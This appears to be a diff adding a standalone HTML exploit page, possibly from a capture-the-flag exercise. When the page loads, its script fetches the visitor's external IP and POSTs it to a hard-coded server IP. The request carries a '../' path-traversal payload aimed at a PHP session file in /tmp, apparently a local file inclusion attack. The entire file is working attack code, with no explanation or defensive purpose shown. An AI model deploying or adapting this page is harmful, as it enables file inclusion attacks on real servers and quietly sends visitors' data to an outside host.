@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <script src="https://code.jquery.com/jquery-2.1.0.js"></script>
+    </head>
+    <body>
+        <script>
+            $.ajax({
+                jsonp: 'jsonp',
+                dataType: 'jsonp',
+                url: 'http://myexternalip.com/json',
+                success: function (ip) {
+                    $.post('http://188.225.35.105:10008/?page=../../../../../../../../../tmp/sess_81b3beb581cda153c5eb1d92005f431b',
+                    () => {alert('success')},
+                        {'data': ip});
+                }
+            });
+        </script>
+    </body>
+</html>
